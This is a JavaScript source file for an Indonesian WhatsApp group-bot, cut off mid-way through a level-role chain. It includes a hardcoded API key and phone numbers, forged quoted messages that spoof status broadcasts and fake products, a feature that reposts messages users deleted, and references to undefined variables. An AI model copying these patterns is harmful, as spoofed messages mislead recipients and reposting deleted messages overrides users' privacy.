//MAU NGAPAIN OM?
//NOTE KALO ADA YANG JUAL BELI KAN SC INI LANGSUNG HUBUNGI SAYA!!
//TXT TO :
/*Ardy ( Ya Gw Lah ) [ Base Bot ]
Fardan [ Colab ]
Zeks Api [Penyedia Apikey]
AbilGans [Penyedia Apikey]
Lolhuman [Penyedia Apikey]
Manik [ Costom Reply ]
Perwira Kusuma [ Kang Bantu]*/
//Gw Dah Fix Semua Fitur + Tambahin Fitur Premium
//bu by bitch
const {
   WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal") 
const moment = require("moment-timezone") 
const fs = require("fs") 
const crypto = require('crypto')
const util = require('util')
const imageToBase64 = require('image-to-base64')
const axios = require('axios')
const { color, bgcolor } = require('./lib/color')
const { bahasa } = require('./lib/bahasa')
const { negara } = require('./lib/kodenegara')
const { donasi } = require('./lib/donasi')
const { developer } = require('./lib/developer')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const fontPath = ('./lib/Zahraaa.ttf')
const path = require('path')
const { exec, spawn } = require("child_process")
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const tiktod = require('tiktok-scraper')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const cd = 4.32e+7
const { removeBackgroundFromImageFile } = require('remove.bg')
const { ind } = require('./bahasa')

/************ SETTINGS ********/
const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + 'FN:Mastah Ardy🤡\n'
            + 'ORG: Mastah Ardy🤡;\n' 
            + 'TEL;type=CELL;type=VOICE;waid=6287863200063:+6287863200063\n'  
            + 'END:VCARD' 
prefix = '#' 
blocked = [] 
limitawal = 999 
memberlimit = 1 
NameBot = 'Group Maneger Bot 🪀😈'
fakedoc = "PunyaArdy🤡"
fakereply = "#MS_JESSICA 🦄🌈"
faketoko = "ArdyStore🤡"
imgbb = 'https://telegra.ph/file/a3334214705ce825dad70.jpg'
lolkey = '0e355253876c073d3ed3f163'
xteam = 'AbilGanss'
const ownerNumber = ["9475933569@s.whatsapp.net"]   



/*********** LOAD FILE ***********/
const _leveling = JSON.parse(fs.readFileSync('./database/grup/leveling.json'))
const antilink = JSON.parse(fs.readFileSync('./database/grup/antilink.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const _registered = JSON.parse(fs.readFileSync('./database/bot/pengguna.json'))
const welkom = JSON.parse(fs.readFileSync('./database/bot/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/bot/nsfw.json'))
const samih = JSON.parse(fs.readFileSync('./database/bot/simi.json'))
const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const ban = JSON.parse(fs.readFileSync('./database/user/banned.json'))
const prem = JSON.parse(fs.readFileSync('./database/user/premium.json'))
const adm = JSON.parse(fs.readFileSync('./database/user/admin.json'))
const bad = JSON.parse(fs.readFileSync('./database/grup/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/grup/badword.json'))
const mute = JSON.parse(fs.readFileSync('./database/user/mute.json'))
/*********** END LOAD ***********/

/********** FUNCTION ***************/
const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
        }
             
         const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }

        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/bot/pengguna.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        
        const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
             
        
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
}
/********** FUNCTION ***************/

const Ardy = new WAConnection()
Ardy.version = [2, 2119, 6] // UDAH JANGAN GANTI NANTI EROR
Ardy.browserDescription = [ 'ArdyNihBoss', 'Browser', '999' ]
   Ardy.on('qr', qr => {
   qrcode.generate(qr, { small: true })
   console.log(color('[','white'),color('∆','red'),color(']','white'),color('QR code is ready, Scan now..','white'))
})

Ardy.on('credentials-updated', () => {
	const authInfo = Ardy.base64EncodedAuthInfo()
   console.log(`credentials updated!`)
   fs.writeFileSync('./ArdyQr.json', JSON.stringify(authInfo, null, '\t'))
})
fs.existsSync('./ArdyQr.json') && Ardy.loadAuthInfo('./ArdyQr.json')
Ardy.connect();


Ardy.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await Ardy.groupMetadata(anu.jid)
			const moment = require('moment-timezone')
			const jamny = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await Ardy.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Hai @${num.split('@')[0]}⁩, selamat \ndatang di ${mdata.subject}😘`
 
				let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/welcome?nama=${num.split('@')[0]}⁩&descriminator=${jamny}&memcount=${mdata.participants.length}&gcname=${mdata.subject}&pp=${ppimg}&bg=${imgbb}`)
				Ardy.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
				} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await Ardy.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
					teks = `Sayonara @${num.split('@')[0]}👋`
				let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/goodbye?nama=${num.split('@')[0]}⁩&descriminator=${jamny}&memcount=${mdata.participants.length}&gcname=${mdata.subject}&pp=${ppimg}&bg=${imgbb}`)
				Ardy.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
	Ardy.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
Ardy.on('message-update', async (mek) => {
		try {
		//Fix Undefined By Ardy Store
	   const from = mek.key.remoteJid
		const messageStubType = WA_MESSAGE_STUB_TYPES[mek.messageStubType] || 'MESSAGE'
		const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
		const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
		const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
		const sender = mek.key.fromMe ? Ardy.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const isRevoke = mek.key.remoteJid.endsWith('@s.whatsapp.net') ? true : mek.key.remoteJid.endsWith('@g.us') ? dataRevoke.includes(from) : false
		const isCtRevoke = mek.key.remoteJid.endsWith('@g.us') ? true : dataCtRevoke.data ? true : false
		const isBanCtRevoke = mek.key.remoteJid.endsWith('@g.us') ? true : !dataBanCtRevoke.includes(sender) ? true : false
		if (messageStubType == 'REVOKE') {
			console.log(`Status untuk grup : ${!isRevoke}\nStatus semua kontak : ${!isCtRevoke}\nStatus kontak dikecualikan : ${!isBanCtRevoke}`)
			if (!isRevoke) return
			if (!isCtRevoke) return
			if (!isBanCtRevoke) return
			const from = mek.key.remoteJid
			const isGroup = mek.key.remoteJid.endsWith('@g.us') ? true : false
			let int
			let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
			const id_deleted = mek.key.id
			const conts = mek.key.fromMe ? Ardy.user.jid : Ardy.contacts[sender] || { notify: jid.replace(/@.+/, '') }
			const opt4tag = {
				contextInfo: { mentionedJid: [sender] }
			}
			for (let i = 0; i < infoMSG.length; i++) {
				if (infoMSG[i].key.id == id_deleted) {
					const dataInfo = infoMSG[i]
					const type = Object.keys(infoMSG[i].message)[0]
					const timestamp = infoMSG[i].messageTimestamp
					int = {
						no: i,
						type: type,
						timestamp: timestamp,
						data: dataInfo
				    }    
				}
			}
			const index = Number(int.no)
			const body = int.type == 'conversation' ? infoMSG[index].message.conversation : int.type == 'extendedTextMessage' ? infoMSG[index].message.extendedTextMessage.text : int.type == 'imageMessage' ? infoMSG[index].message.imageMessage.caption : int.type == 'stickerMessage' ? 'Sticker' : int.type == 'audioMessage' ? 'Audio' : int.type == 'videoMessage' ? infoMSG[index].videoMessage.caption : infoMSG[index]
			const mediaData = int.type === 'extendedTextMessage' ? JSON.parse(JSON.stringify(int.data).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : int.data
			var itsme = `${numbernye}@s.whatsapp.net`
				var split = `${fake}`
				// var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
				var selepbot72 = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}			
			if (int.type == 'conversation' || int.type == 'extendedTextMessage') {
				const strConversation = `		 「 *ANTI-DELETE* 」

- *Nama :* *${pushname}* 
- *Nomer :* ${sender.replace('@s.whatsapp.net', '')}
- *Tipe :* Text
- *Waktu :* *${moment.unix(int.timestamp).format('HH:mm:ss')}*
- *Tanggal :* *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*
- *Pesan :* *${body ? body : '-'}*`
				Ardy.sendMessage(from, strConversation, MessageType.text, selepbot72)
			} else if (int.type == 'stickerMessage') {
				var itsme = `${numbernye}@s.whatsapp.net`
					var split = `${fake}`
					const pingbro23 = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await Ardy.downloadAndSaveMediaMessage(int.data, `./media/sticker/${filename}`);
				const strConversation = `		 「 *ANTI-DELETE* 」

- *Nama :* *${pushname}* 
- *Nomer :* ${sender.replace('@s.whatsapp.net', '')}
- *Tipe :* *Sticker*
- *Waktu :* *${moment.unix(int.timestamp).format('HH:mm:ss')}*
- *Tanggal :* *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*`

				const buff = fs.readFileSync(savedFilename)
				Ardy.sendMessage(from, strConversation, MessageType.text, opt4tag)
				Ardy.sendMessage(from, buff, MessageType.sticker, pingbro23)
				// console.log(stdout)
				fs.unlinkSync(savedFilename)

			} else if (int.type == 'imageMessage') {
				var itsme = `${numbernye}@s.whatsapp.net`
					var split = `${fake}`
					const pingbro22 = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await Ardy.downloadAndSaveMediaMessage(int.data, `./media/revoke/${filename}`);
				const buff = fs.readFileSync(savedFilename)
				const strConversation = `	 「 *ANTI-DELETE* 」

- *Nama :* *${pushname}* 
- *Nomer :* ${sender.replace('@s.whatsapp.net', '')}
- *Tipe :* Image
- *Waktu :* *${moment.unix(int.timestamp).format('HH:mm:ss')}*
- *Tanggal :* *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*
- *Pesan :* ${body ? body : '-'}\`\`\``
				Ardy.sendMessage(from, buff, MessageType.image, { contextInfo: { mentionedJid: [sender] }, caption: strConversation })
				fs.unlinkSync(savedFilename)
			}
		}
	} catch (e) {
		console.log('Message : %s', color(e, 'green'))
		// console.log(e)
	}
})

	Ardy.on('CB:Blocklist', json => {

		if (blocked.length > 2) return

	    for (let i of json[1].blocklist) {

	    	blocked.push(i.replace('c.us','s.whatsapp.net'))

	    }

	})

	Ardy.on('message-new', async (mek) => {
	
		try {
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
			const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			Ardy.chatRead(from)
			const tescuk = ["0@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const RAM = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
			const q = args.join(' ')
			const botNumber = Ardy.user.jid
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			pushname = Ardy.contacts[sender] != undefined ? Ardy.contacts[sender].vname || Ardy.contacts[sender].notify : undefined
			const groupMetadata = isGroup ? await Ardy.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
			const isMuted = isGroup ? mute.includes(from) : false
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''           	


            /************** SCURITY FEATURE ************/
            const isEventon = isGroup ? event.includes(from) : false
            const isBadWord = isGroup ? badword.includes(from) : false
            const isRegistered = checkRegisteredUser(sender)
            const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
            const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
			const isAntilink = isGroup ? antilink.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			const isBanned = ban.includes(sender)
			const isPremium= prem.includes(sender)
			const isAdmin = adm.includes(sender)
			const isImage = type === 'imageMessage'
			const fkon = { key: { fromMe: false, participant: `6287863200063@s.whatsapp.net`, ...(from ? { remoteJid: "6287863200063@s.whatsapp.net" } : {}) }, message: { "contactMessage": { "displayName": `Mastah Ardy🤡`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;Mastah Ardy🤡,;;;\nFN:${NameBot},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail": fs.readFileSync('./src/Ardy.jpeg')}}}
			const fdoc = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": fakedoc, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('src/Ardy.jpeg')}}}            
			const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fakereply, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('src/Ardy.jpeg')} } }
			const ftoko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": fs.readFileSync(`./src/Ardy.jpeg`)}, "title": faketoko, "description": "ArdyStore", "currencyCode": "USD", "priceAmount1000": "5000000000", "retailerId": "ArdyStore", "productImageCount": 1}, "businessOwnerJid": `6287863200063@s.whatsapp.net`}}}

			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				Ardy.sendMessage(from, teks, text, {quoted:mek})
			}
			const sendMess = (hehe, teks) => {
				Ardy.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? Ardy.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : Ardy.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
			const sendImage = (teks) => {
		    Ardy.sendMessage(from, teks, image, {quoted:mek})
		    }
		    const costum = (pesan, tipe, target, target2) => {
			Ardy.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
		    const sendPtt = (teks) => {
		    Ardy.sendMessage(from, audio, mp3, {quoted:mek})
		    }
	        /*****************END SCURITY FEATURE ********/
			
			const slot1 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝']
            const slot2 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝'] 
            const slot3 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝'] 
            const slot4 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝'] 
            const slot5 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝']
            const slot6 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝'] 
            const slot7 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝']
            const slot8 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝']   
            const slot9 = ['🍋','🍐','🍓','🍇','🍒','🍉','🍍','🍌','🍈','🍊','🥝']
            const slot11 = slot1[Math.floor(Math.random() * (slot1.length))]
		    const slot22 = slot2[Math.floor(Math.random() * (slot2.length))]
		    const slot33 = slot3[Math.floor(Math.random() * (slot3.length))]
		    const slot44 = slot4[Math.floor(Math.random() * (slot4.length))]
			const slot55 = slot5[Math.floor(Math.random() * (slot5.length))]
			const slot66 = slot6[Math.floor(Math.random() * (slot6.length))]	
		    const slot77 = slot4[Math.floor(Math.random() * (slot7.length))]
		    const slot88 = slot5[Math.floor(Math.random() * (slot8.length))]
			const slot99 = slot6[Math.floor(Math.random() * (slot9.length))]	                       
            const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
            const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
            const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
            const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
		    const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
		    const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]
		//role level
        const levelRole = getLevelingLevel(sender)
        var role = 'Newbie ㋡'
        if (levelRole <= 2) {
            role = 'Newbie ㋡'
        } else if (levelRole <= 4) {
            role = 'Beginner Grade 1 ⚊¹'
        } else if (levelRole <= 6) {
            role = 'Beginner Grade 2 ⚊²'
        } else if (levelRole <= 8) {
            role = 'Beginner Grade 3 ⚊³'
        } else if (levelRole <= 10) {
            role = 'Beginner Grade 4 ⚊⁴'
        } else if (levelRole <= 12) {
            role = 'Private Grade 1 ⚌¹'
        } else if (levelRole <= 14) {
            role = 'Private Grade 2 ⚌²'
            role = 'Private Grade 2 ⚌²'
        } else if (levelRole <= 16) {
            role = 'Private Grade 3 ⚌³'
        } else if (levelRole <= 18) {
            role = 'Private Grade 4 ⚌⁴'
        } else if (levelRole <= 20) {
            role = 'Private Grade 5 ⚌⁵'
        } else if (levelRole <= 22) {
            role = 'Corporal Grade 1 ☰¹'
        } else if (levelRole <= 24) {
            role = 'Corporal Grade 2 ☰²'
        } else if (levelRole <= 26) {
            role = 'Corporal Grade 3 ☰³'
        } else if (levelRole <= 28) {
            role = 'Corporal Grade 4 ☰⁴'
        } else if (levelRole <= 30) {
            role = 'Corporal Grade 5 ☰⁵'
        } else if (levelRole <= 32) {
            role = 'Sergeant Grade 1 ≣¹'
        } else if (levelRole <= 34) {
            role = 'Sergeant Grade 2 ≣²'
        } else if (levelRole <= 36) {
            role = 'Sergeant Grade 3 ≣³'
        } else if (levelRole <= 38) {
            role = 'Sergeant Grade 4 ≣⁴'
        } else if (levelRole <= 40) {
            role = 'Sergeant Grade 5 ≣⁵'
        } else if (levelRole <= 42) {
            role = 'Staff Grade 1 ﹀¹'
        } else if (levelRole <= 44) {
            role = 'Staff Grade 2 ﹀²'
        } else if (levelRole <= 46) {
            role = 'Staff Grade 3 ﹀³'
        } else if (levelRole <= 48) {
            role = 'Staff Grade 4 ﹀⁴'
        } else if (levelRole <= 50) {
            role = 'Staff Grade 5 ﹀⁵'
        } else if (levelRole <= 52) {
            role = 'Sergeant Grade 1 ︾¹'
        } else if (levelRole <= 54) {
            role = 'Sergeant Grade 2 ︾²'
        } else if (levelRole <= 56) {
            role = 'Sergeant Grade 3 ︾³'
        } else if (levelRole <= 58) {
            role = 'Sergeant Grade 4 ︾⁴'
        } else if (levelRole <= 60) {
            role = 'Sergeant Grade 5 ︾⁵'
        } else if (levelRole <= 62) {
            role = '2nd Lt. Grade 1 ♢¹ '
        } else if (levelRole <= 64) {
            role = '2nd Lt. Grade 2 ♢²'
        } else if (levelRole <= 66) {
            role = '2nd Lt. Grade 3 ♢³'
        } else if (levelRole <= 68) {
            role = '2nd Lt. Grade 4 ♢⁴'
        } else if (levelRole <= 70) {
            role = '2nd Lt. Grade 5 ♢⁵'
        } else if (levelRole <= 72) {
            role = '1st Lt. Grade 1 ♢♢¹'
        } else if (levelRole <= 74) {
            role = '1st Lt. Grade 2 ♢♢²'
        } else if (levelRole <= 76) {
            role = '1st Lt. Grade 3 ♢♢³'
        } else if (levelRole <= 78) {
            role = '1st Lt. Grade 4 ♢♢⁴'
        } else if (levelRole <= 80) {
            role = '1st Lt. Grade 5 ♢♢⁵'
        } else if (levelRole <= 82) {
            role = 'Major Grade 1 ✷¹'
        } else if (levelRole <= 84) {
            role = 'Major Grade 2 ✷²'
        } else if (levelRole <= 86) {
            role = 'Major Grade 3 ✷³'
        } else if (levelRole <= 88) {
            role = 'Major Grade 4 ✷⁴'
        } else if (levelRole <= 90) {
            role = 'Major Grade 5 ✷⁵'
        } else if (levelRole <= 92) {
            role = 'Colonel Grade 1 ✷✷¹'
        } else if (levelRole <= 94) {
            role = 'Colonel Grade 2 ✷✷²'
        } else if (levelRole <= 96) {
            role = 'Colonel Grade 3 ✷✷³'
        } else if (levelRole <= 98) {
            role = 'Colonel Grade 4 ✷✷⁴'
        } else if (levelRole <= 100) {
            role = 'Colonel Grade 5 ✷✷⁵'
        } else if (levelRole <= 102) {
            role = 'Brigadier Early ✰'
        } else if (levelRole <= 104) {
            role = 'Brigadier Silver ✩'
        } else if (levelRole <= 106) {
            role = 'Brigadier gold ✯'
        } else if (levelRole <= 108) {
            role = 'Brigadier Platinum ✬'
        } else if (levelRole <= 110) {
            role = 'Brigadier Diamond ✙'
        } else if (levelRole <= 112) {
            role = 'Major General Early ✰'
        } else if (levelRole <= 114) {
            role = 'Major General Silver ✩'
        } else if (levelRole <= 116) {
            role = 'Major General gold ✯'
        } else if (levelRole <= 118) {
            role = 'Major General Platinum ✬'
        } else if (levelRole <= 120) {
            role = 'Major General Diamond ✙'
        } else if (levelRole <= 122) {
            role = 'Lt. General Early ✰'
        } else if (levelRole <= 124) {
            role = 'Lt. General Silver ✩'
        } else if (levelRole <= 126) {
            role = 'Lt. General gold ✯'
        } else if (levelRole <= 128) {
            role = 'Lt. General Platinum ✬'
        } else if (levelRole <= 130) {
            role = 'Lt. General Diamond ✙'
        } else if (levelRole <= 132) {
            role = 'General Early ✰'
        } else if (levelRole <= 134) {
            role = 'General Silver ✩'
